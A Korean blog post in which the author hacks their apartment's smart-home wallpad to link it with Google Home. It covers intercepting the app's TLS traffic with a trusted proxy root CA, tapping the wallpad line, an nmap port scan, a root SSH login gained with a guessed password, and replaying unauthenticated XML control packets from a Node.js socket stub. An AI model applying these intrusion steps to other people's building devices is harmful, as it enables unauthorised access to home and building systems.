---
layout: post
title:  "스마트홈 Google Home과 연동시키기"
date:   2021-03-19 21:17:37 +0900
categories: iot
tags: 구글 홈, 스마트홈, 연동
background: https://play-lh.googleusercontent.com/JyMcKBSLLteU_ZhAGvsdqLaNCDqczd0jOQqoBPCjc_AzPntSyz8Xg2CPd0XYlhHsIg
---

## 개요

요즘 신축 아파트에는 스마트홈이라는 시스템이 구현되어 있습니다.

스마트홈을 이용하면 집 밖에서도 집 안의 조명을 제어할 수 있고, 가스 벨브를 잠글 수 있는 기능 등을 이용할 수 있죠.

처음에는 드디어 이런 것도 생기는구나 하며 기대 가득으로 앱을 깔아 써보니 문제점이 보이더군요.

제어 자체는 문제가 없었으나 UI가 난잡합니다.
방 단위로 해당 방에 등록된 모든 기기를 켜고 끄게 되어 있고, 기기를 하나씩 제어할 수는 있었으나 기기 이름이 조명1, 조명2, 조명3 이런 식으로 고정되어 있는 것이 직관적이지 않아 마음에 들지 않았습니다.
게다가 "스마트홈" 이라는 이름과는 달리 전혀 스마트하지 않고 자사 스피커 아니면 보이스 제어를 이용하지 못하는 상황이었죠.

그리고 결정적으로...

# 🤮

너무 느립니다.

앱을 처음 로딩하는 스플래시 화면에서 2~3초를 잡아 먹고 기기 목록 불러오는데 또 시간을 잡아먹고, 제어하는 데 또 3~4초 시간을 잡아 먹는건...

<img src="{{ '/assets/posts/2021-03-19-google-home/crossline.jpg' | relative_url }}"  >

선 넘었죠. 그래서 결국

<img src="{{ '/assets/posts/2021-03-19-google-home/screenshot1.png' | relative_url }}" height="600px" >

기존에 통신사에서 제공하는 스마트홈 앱을 갈아버리고 Google Home으로 연동시켜 봤습니다.

이번 게시글에서는 혹시 저와 같은 처지의 분들의 삽질을 덜어드리고자 제가 구현한 방식을 조금 알려드릴까 합니다. 우선, <b>이 글을 참고하여 구현하신 부분에 대해서 저는 책임을 지지 않는다는 점 알려드리고 시작합니다.</b>

## 삽질

처음에는 염치도 없이 스마트홈 앱에서 보내는 패킷을 보고 그 패킷을 그대로 전송하면 될까 싶어 애플리케이션 패킷을 얻는 작업을 진행했습니다.

아주 간단하게 생각해보죠. 어느 기기를 가지고 있으면 그 기기에서 주고 받는 패킷도 알 수 있습니다.
그 기기라 함은 요청을 담당하는 서버와 요청을 보내는 iOS 기기 두 가지가 있겠네요.

일단 서버를 장악하려는 것은 긴 수감 생활을 거쳐야하기 때문에 제 관심사 밖입니다. 패스.
그러면 자연스럽게 iOS 기기가 선택지가 되겠군요.

iOS 기기에서 바로 패킷을 얻을 수 있으면 좋겠으나 순정 상태의 iOS에서는 불가능합니다. 탈옥을 하면야 가능하겠지만 굳이 이것 하나 하려고 기기를 탈옥하고 싶지는 않습니다.

음... 그러면 어떻게 기기의 패킷을 읽을 수 있을까요? 두 기기 다 손을 쓸 수 없는 상황인데.

다시 간단히 생각해봅시다. 갑자기 뜬금 없을 수도 있지만 사람 A와 사람 B가 서로 얘기를 주고 받는 상황을 가정해보죠.
A가 B에게 말을 전달하려면 A가 소리를 내어 매질인 공기를 통해 B의 고막에 닿는 과정이 필요합니다.
공기를 통해 소리가 전달된다는 특성상 소리가 B에게만 일직선으로 퍼진다는 보장이 없기 때문에 A가 완전 B의 귀에다 대고 속닥속닥 거리는 것이 아닌 이상 같은 공간에 있는 사람들은 A와 B의 대화 내용을 엿들을 수 있게 됩니다.

컴퓨터에서의 통신도 이와 비슷하게 작동합니다. A에 iOS 기기, B에 서버를 대입하면 되는 일이죠.
iOS 기기에서 서버에게 패킷을 전달하려면 iOS 기기가 패킷을 만들어 매질인 네트워크 망을 이용해 서버의 네트워크에 닿는 과정이 필요합니다.
네트워크 망을 통해 패킷이 전달된다는 특성상 패킷이 서버에게만 직접 전달된다는 보장이 없기 때문에 iOS 기기가 서버와 직접 연결하여 속닥속닥 거리는 것이 아닌 이상 같은 네트워크에 있는 사람들은 iOS 기기와 서버의 대화 내용을 엿들을 수 있게 됩니다.

!!!

그럴싸하게 들리는 개소리로 이상한 접근을 했습니다. 제 개소리가 맞다면 iOS 기기와 같은 네트워크라면 iOS 기기와 서버간의 패킷을 엿볼 수 있겠죠.
사람 A와 사람 B의 중간에서 엿듣는 사람이 있어야 뭘 알 수 있는 것처럼 iOS 기기와 서버의 중간에서 엿듣는 것이 있어야합니다.
"엿듣는 것"이 사람이면 좋겠지만 우리 사람은 기계 세상을 이해할 수 없습니다.
그러니 눈에는 눈, 이에는 이. 기계로 맞서야죠.

이제 A와 B씨는 들어가셔도 좋습니다.

iOS 기기와 서버 사이의 연결에 패킷을 읽을 수 있는 기계를 만들어 놓자는 거에요.

그 역할을 프록시 서버가 할 수 있습니다. 프록시 서버는 iOS 기기에서 보내는 네트워크 요청들을 프록시 서버에서 대신 대상 서버로 전송해주는 기능을 하는데, 이 때 프록시 서버의 패킷을 보면 iOS 기기에서 주고 받는 패킷을 확인할 수 있게 됩니다.

<img src="{{ '/assets/posts/2021-03-19-google-home/charles.png' | relative_url }}">

이제 이 역할에 상응하는 애플리케이션이 존재합니다. macOS 애플리케이션 중 [Charles Proxy](https://www.charlesproxy.com) 라는 것이 있는데, Charles Proxy를 사용하면 간이 프록시 서버를 구축하여 프록시 서버를 거쳐 오고 가는 패킷을 볼 수 있습니다.

구성 방법은 간단합니다. macOS 기기와 iOS 기기를 동일한 네트워크에 연결하고 iOS 기기에서 프록시 서버 주소를 노트북 IP로 설정하면 되는 것이죠.

이렇게 iOS에서 주고 받는 패킷을 확인할 수 있게 되었습니다!

근데 한 가지 문제점이 더 생겨버렸네요.
스마트홈 애플리케이션과 서버 사이엔 내용을 암호화하는 SSL 통신을 사용하기 때문에 어떤 내용을 주고 받는지 알 수 없습니다.

음... SSL은 또 뭘까요? 이를 설명하기 위해 다시 A와 B를 부를 필요가 있겠네요.

저번 대화 예시를 통해 A와 B는 매우 화가 난 상태입니다. 엿듣는 사람이 생기니 간직하고 싶던 비밀이 더 이상 비밀이 아니게 된겁니다.

그렇게 몇날 몇일을 고민하다가 A가 기발한 수를 떠올리고 온 것이죠.

A는 B에게 이렇게 말했습니다. "우리가 서로 말하는 말이 다 들린다면 우리만 아는 말로 말하면 될 거 아냐?"

그러고는 A와 B는 이런 복잡한 대화 방식을 만들어 냅니다.

1) A가 B에게 `개소리`와 "그 우리 전에 말한 식들 있잖아~ X, Y, Z 식~~" 라는 식의 말을 합니다.
2) B가 A에게 마찬가지로 `개소리`로 말을 시작하고 "어! 그 중에 Y 쓰자!" 라고 한 후에 자신이 가지고 있던 A4 용지를 보여주고 어느 숫자*를 말합니다.
  - 2* 이 어느 숫자는 "Y식"에 넣은 후의 결과 값으로, `Y식에 넣기 전의 숫자`를 이용해 `넣은 후의 숫자`를 알기는 쉽기만 그 역은 어렵습니다. 역을 알기 위해서는 모든 숫자를 대입해봐야 합니다.
  - Y 식에 넣기 전에 나온 숫자는 B만 알고 있습니다.

3) A가 B에게 받은 A4 용지가 정상적으로 만든 것이 맞는지 확인하고 A4 용지에 적혀 있는 글자들을 `미리 만들어 둔 절대 숫자*`를 통해 해독합니다. 해독이 가능하면 그 대화는 서로가 아는 그 사람인 것으로 신뢰할 수 있게 됩니다.
  - 미리 만들어둔 절대 숫자는 A와 B가 이전에 미리 만들어둔 A4 용지와 함께 만든 숫자입니다. 이 값은 사전에 미리 서로 알아야 할 필요가 있습니다.

4) A가 만든 개소리는 사실 의미가 있었습니다! `A가 만든 개소리`를 "Y식"에 넣고 만들어진 숫자를 `B가 보낸 개소리를 "Y 방식"에 넣은 값`으로 다시 "Y식"에 넣어 B에게 전달합니다.
5) B가 A에게 전달 받는 숫자를 B만 알고 있던 `Y식에 넣기 전의 숫자`로 해독해냅니다. 그러면 그 값은 A와 B안 알고 있는 상태가 됩니다.
6) 그 값을 가지고 A와 B가 통신을 할 때 지지고 볶습니다. 다른 사람들은 서로 뭔 소리를 하는지 들리긴 하기만 이해할 수 없습니다.

A와 B는 IQ 200의 천재가 분명합니다. 어떻게 이런 복잡한 식을 만들어 냈을까요? 모르겠네요. A와 B가 재수없는 사람이란 건 확실합니다.

어쨌든 이 대화 방식이 순식간에 입소문을 타 다른 사람들도 널리 쓰게되었습니다. 그리고 그 안정성이 입증되어 정부에서도 사용하기 시작했죠. 이 대화법이 바로 우리가 지금 인터넷 상에서 사용하는 TLS 연결입니다.

이제 기계에서는 어떻게 작동하는지 봐야죠. A에 브라우저, B에 서버를 대입하면 됩니다.

... 근데 너무 기니 생략할게요. 실제 언어로 바꾸자면 `개소리`는 랜덤하게 생성된 값, `A4 용지`는 인증서, `식` 이란 것은 `암호화 방식`으로 이해하시면 될 것 같습니다.

이렇게 왜 우리가 보안 연결된 내용을 알 수 없는지를 그들의 말하기 방식을 통해 상세히 알게 되었습니다. 그럼 다시 돌아가 어떻게 SSL 통신의 내용을 볼 수 있을까요? 다행히 Charles Proxy에서 SSL 통신의 내용을 볼 수 있도록 하는 기능이 존재합니다.

<img src="{{ '/assets/posts/2021-03-19-google-home/ssl_proxy1.png' | relative_url }}">

SSL Proxying 기능이죠. 그런데...

<img src="{{ '/assets/posts/2021-03-19-google-home/blocked.png' | relative_url }}" height="600px">

이 상태에서 SSL로 보안 연결된 서버에 요청을 보내보면 위 사진과 같이 SSL 인증서가 잘못되었다는 오류와 함께 접속을 거부하게 됩니다.

무슨 일일까요? 해당 오류는 Charles Proxy에서 SSL 연결의 내용을 읽기 위해 인증서를 바꿔치면서 최상위 인증서를 신뢰하지 못해 생긴 오류입니다. 최상위 인증서가 뭘까요?

혹시 아까 전 이야기 기억나세요? 위 이야기의 3번

> 3) A가 B에게 받은 A4 용지가 정상적으로 만든 것이 맞는지 확인하고 A4 용지에 적혀 있는 글자들을 `미리 만들어 둔 절대 숫자*`를 통해 해독합니다. 해독이 가능하면 그 대화는 서로가 아는 그 사람인 것으로 신뢰할 수 있게 됩니다.

을 다시 실제 용어로 바꿔봅시다.

> 3) 브라우저가 서버에게 받은 인증서가 정상적으로 만들어진 인증서가 맞는지 확인하고 인증서에 있는 내용을 `Root CA의 공개 키`를 통해 해독합니다. 해독이 가능하면 그 연결은 서로가 아는 그 사람의 연결인 것으로 신뢰할 수 있게 됩니다.

아! 지금 이 상황은 브라우저가 서버에게 받은 인증서를 "최상위 인증서에 의해" 정상적으로 만들어진 인증서로 인식하지 않아 생긴 오류입니다. 그러면 브라우저가 서버에게 받은 인증서를 정상인 것처럼 만들어야 할텐데 이를 어떻게 할까요? 간단합니다. Charles Proxy에서 만든 인증서를 정상적인 인증서로 인식할 수 있도록 Charles Proxy의 자체 서명한 최상위 인증서를 시스템이 신뢰할 수 있도록 만들면 됩니다.

최상위 인증서인 Root CA는 시스템 인증서 저장소나 Firefox 같은 브라우저의 경우 브라우저 내의 인증서 저장소에 미리 저장된 상태로 존재하는데, 이 저장소 안에 자체 서명한 인증서를 넣으면 브라우저에서는 해당 루트 인증서가 발급한 인증서를 정상인 것으로 간주하고 연결을 수립 시켜줍니다.

iOS의 웹 브라우징 프레임워크인 WebKit은 시스템에 설치된 Root CA 목록 (일반 > 정보 > 인증서 신뢰 설정에서 확인 가능) 을 사용하기 때문에 이 저장소 안에 자체 서명한 인증서를 넣어주면 됩니다.

Root CA를 설치하는 과정은 별로 중요하지 않기 때문에 자세히는 설명드리지 않으니 간략하게 설명드리면 pem 파일 열고 설정에서 프로파일을 설치하고 인증서 신뢰 옵션을 키면되는 과정입니다.

이렇게 설치하면 Charles Proxy에서 SSL 패킷을 볼 수 있게 됩니다.

자, 정말 구글 홈 연동에서는 알 필요 없는 쓸모 없는 이론이 길었는데... 맙소사. 그냥 여기까지는 삽질이었습니다. 앱은 평범하게 통신사 서버와 통신하는 구조였고 통신사 서버에 직접 요청을 보내면 되겠으나
매번 로그인해서 세션 토큰을 가져오는 것도 귀찮고 무엇보다 제가 연동하려던 목적인 지연 시간 해결은 커녕 지연 시간만 더 길어질 것이 뻔하기 때문에 통신사 서버를 거치는 방식은 사용하지 않도록 하겠습니다.

## 다시 원점으로

자... 지금까지 얘기 한 내용들은 다 잊어버립시다. 시간만 날렸어요.

이번엔 멀리 나가지 말고 집 안에 있는 기기부터 생각을 해봅시다. 각 가정마다 월패드라는 기기가 존재하는데, 이 기기가 집안의 도어락, 조명, 가스, 인터폰등과 연결되어 관리사무소와 통신할 수 있는 구조로 되어 있는 것으로 추측됩니다.

실제로 분해해보니 그렇더라구요. 사진은 지워버려 남지 않았지만 월패드 뒤에 RJ45 규격의 포트가 있어 이 포트를 통해 각 제어 기기나 관리사무소 (외부) 와 통신을 하는 것을 확인했습니다.

그 외부로 이어지는 선을 볼 수 있다면 제어를 했을 때 어떤 패킷이 오가는지 알 수 있겠죠?
저는 그 선이 인터넷 단자함을 지나가는 것을 확인했고, 그 사이에 하나의 기기를 두고 오고 가는 패킷을 보도록 하겠습니다. 우선은 보안을 위해 외부 연결과 단절된 유선 공유기를 설치해 외부에서 오는 선, 내부에서 나오는 선을 꽂고 남는 포트에 노트북을 연결합니다.

그리고 공유기 설정에 들어가 브릿지 모드를 켜고 외부 선에서 들어오는 모든 연결을 노트북으로 미러링하도록 설정합니다.
그러면 외부에서 들어온 모든 연결이 노트북의 랜포트로 그대로 복제되어 들어갑니다. 그러면 패킷을 볼 수 있겠죠.

<img src="{{ '/assets/posts/2021-03-19-google-home/wireshark.png' | relative_url }}">

이전에 설치한 Charles는 HTTP 요청만 볼 수 있기 때문에, 이번에는 모든 "패킷"을 볼 수 있는 [WireShark](https://www.wireshark.org/)를 설치하여 패킷을 관찰하도록 합시다.

<img src="{{ '/assets/posts/2021-03-19-google-home/wireshark_packets.png' | relative_url }}">

실행 후 인터페이스를 클릭하면 저렇게 무수히 많은 패킷들이 지나가는 것을 확인 할 수 있습니다. 그 중에서 스마트홈 애플리케이션에서 조명을 제어할 때마다 특정 IP에서 특정 IP의 포트로 어느 패킷이 전송되는 것을 확인 할 수 있었습니다.

아마 이 패킷의 발신지 IP가 관리사무소의 서버, 대상지 IP가 월패드에 부여된 IP겠죠. 대상지 IP 끝자리가 층과 호를 포함하고 있는 것을 보니 각 세대 별로 IP가 고정으로 부여되는 것 같습니다.

자세한 패킷은 나중에 분석하도록 하고, 대상지 IP를 알아냈으니 대상지 서버를 분석해보도록 하겠습니다. 우선 nmap을 사용하여 어느 포트가 열려 있는지 확인 해보도록 하죠.

```
ubuntu@ubuntu:~$ sudo nmap -sS (대상지 IP 주소) -p 1-65535
Starting Nmap 7.80 ( https://nmap.org ) at 20XX-XX-XX XX:XX UTC
Nmap scan report for (대상지 IP 주소)
Host is up (0.00051s latency).
Not shown: 65527 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
8999/tcp  open  bctp
17000/tcp open  unknown
18000/tcp open  biimenu
18200/tcp open  unknown
18300/tcp open  unknown
18900/tcp open  unknown
19900/tcp open  unknown
MAC Address: 00:XX:XX:XX:XX:XX (기기 제조사 이름)

Nmap done: 1 IP address (1 host up) scanned in 13.35 seconds
```

???? 분명히 프로덕션 제품일텐데도 ssh 포트가 열려 있네요. 개발 단계에서 디버깅을 위해 만든 포트 같습니다.
ssh 포트 외에는 관리 사무소와 통신을 위한 포트, 또 다른 하나는 디버깅 프로그램의 포트네요.
바로 ssh 연결 날려봤습니다.

```
ubuntu@ubuntu:~$ ssh root@(대상지 IP 주소)
The authenticity of host '(대상지 IP 주소) (대상지 IP 주소)' can't be established.
ECDSA key fingerprint is SHA256:Xx/XXXXXXXXXXXXXXXXXXXXXXXXXXXX/XXXXXXXXXXX.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '(대상지 IP 주소)' (ECDSA) to the list of known hosts.
root@(대상지 IP 주소)'s password:
```

헐... 연결이 가능한 ssh 포트였습니다. 여기서 루트 비밀번호를 알아내기는 역시 어려울 것 같아 조금...

```
ubuntu@ubuntu:~$ ssh root@(대상지 IP 주소)
The authenticity of host '(대상지 IP 주소) (대상지 IP 주소)' can't be established.
ECDSA key fingerprint is SHA256:Xx/XXXXXXXXXXXXXXXXXXXXXXXXXXXX/XXXXXXXXXXX.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '(대상지 IP 주소)' (ECDSA) to the list of known hosts.
root@(대상지 IP 주소)'s password:
~ # 
```

<img src="{{ '/assets/posts/2021-03-19-google-home/crossline.jpg' | relative_url }}"  >

엥... 루트 비밀번호가 너무 쉽습니다. Bruteforce나 수많은 Dictionary Attack 없이도 "인간이라면 넣어볼만한 사전 공격"을 통해 비밀번호를 쉽게 따냈습니다.

루트 비밀번호를 어렵게 설정하든, 포트를 비활성화하든 대책이 필요해 보입니다. 공격자가 루트 비밀번호를 탈취할 때 발생하는 피해는 상상하지 않아도 알 수 있겠죠.

```
~ # ls
Settings         etc              lib              mnt              nand2            proc             sys              tmp_patchclient
bin              home             linuxrc          mount            nand3            roottest.txt     tmp              usr
dev              init             lost+found       nand1            nand4            sbin             tmp_ipphone      var
~ # cd nand1
/nand1 # ls
XXXXXX       boot.sh     group       XXXXXX      XXXXXX       XXXXXX  XXXXXX  passwd      run.sh      scripts
/nand1 # cd XXXXXX
/nand1/XXXXXX # ls
3rdlib            ReleaseNotes.txt  init.sh           oslib             osmodule
/nand1/XXXXXX # cat ReleaseNotes.txt
[2015-04-20]
작성자 : XXX
수정 내용
  - IP Phone 배포

[2015-04-21]
작성자 : XXX
수정 내용
  - Utility_byLER을 Debug/Release/Debug_Desktop 버젼으로 배포

...
```

릴리즈 노트를 텍스트 파일로 관리하네요.

이렇게 얼떨결에 월패드의 바이너리 파일과 시스템 암호를 취득했는데, 바이너리 분석은 아직 흥미와 지식이 없어 다음에 기회가 된다면 그 때 분석을 해봐야겠습니다.

아무튼, ssh 세션을 종료하고 다시 패킷 분석으로 돌아가, 스마트홈 앱에서 기기 제어 버튼을 누르면서 전송되는 각 패킷을 보니 다음과 같은 형식으로 TCP 패킷이 전송되더군요.

```xml
00000804<message>
  <header>
    <feedback>true</feedback>
    <dest>DeviceManager</dest>
    <type>invoke</type>
  </header>
  <body>
    <device>
      <uid>(기기 ID)</uid>
      <uidname>(기기 종류)</uidname>
      <service>
        <explicit></explicit>
        <argument>(상태 값)</argument>
        <name>onoff</name>
        <comment>È´Å</comment>
      </service>
    </device>
  </body>
</message>
```

앞의 8글자는 본문의 길이. 그 후로는 본문을 담아 전송하는 매우 간단한 형태의 패킷입니다. 인증 관련 내용이 없어 일단 패킷이면 다 받는 듯 합니다.
그러면 제 패킷도 받아들여주겠죠. 저 패킷을 그대로 전송하기 위해 Node.js로 구현해봤습니다. Node.js에 내장된 [net 라이브러리](https://nodejs.org/api/net.html)를 이용하면
TCP 요청을 손쉽게 보낼 수 있습니다.

```js
const net = require('net')

const PORT = 0 // 대상지 서버 포트
const IP = "" // 대상지 서버 IP

let socket = net.connect({ port: 포트, host: IP })

socket.on('connect', () => {
  socket.write(
    // 제어 내용
  )
})
```

그리고 요청을 보내니 정말 조명이 제어 됐습니다. 이를 통해 그냥 패킷만 들어오면 무조건 제어를 허용한다는 것을 알 수 있네요.

## 이제 구글 홈에 연동하자

구글 홈에 적용될 내용은 다음 번에 이어쓸 수 있도록 하겠습니다.

<!--
Google Home은 규격에 맞춘 기기들을 한 앱에서 제어할 수 있도록 해주는 플랫폼입니다. 스마트홈 앱도 사용하기 불편할 뿐이지 이런 형식의 앱이라 볼 수 있죠.

<img src="https://play-lh.googleusercontent.com/PkL8Nr3hDKxb9GCHJVKemj8HPLR64TpwELWYoHud42STxoh8vWkagsV2MhrMiD6a3A=w1440-h620-rw">

Google Home에 등록된 기기들은 Google 플랫폼에서 제공하는 Google Assistant 같은 앱에서도 사용할 수 있습니다. 이는 Google Nest 기기나 휴대폰의 어시스턴트로 "불 좀 꺼줘"라고 말하면 기기가 제어된다는 소리죠.

<img src="{{ '/assets/posts/2021-03-19-google-home/home_add.png' | relative_url }}" height="600px">

또 구글에서 서드 파티 기기를 등록할 수 있도록 API를 제공하는데요, API를 사용하면 구글 앱에서 제어하는 동작을 특정 서버로 전송이 가능합니다.

<img src="{{ '/assets/posts/2021-03-19-google-home/actions_list.png' | relative_url }}">

이 API를 사용하기 위해 [Google Actions Console](https://console.actions.google.com/)로 이동하고, New Project 버튼을 눌러줍니다.

<img src="{{ '/assets/posts/2021-03-19-google-home/actions_home.png' | relative_url }}">

프로젝트 이름과 기타 설정을 입력해주고 Create project 버튼을 눌러줍니다.

<img src="{{ '/assets/posts/2021-03-19-google-home/actions_shome.png' | relative_url }}">

Smart Home 카테고리를 선택 후 Start Building 버튼을 눌러주세요.

그럼 Overview 화면이 나오게 되는데, Quick Setup 목록의 Setup account linking 링크를 클릭해줍니다. -->

부족한 필력의 긴 글 읽어주셔서 감사합니다.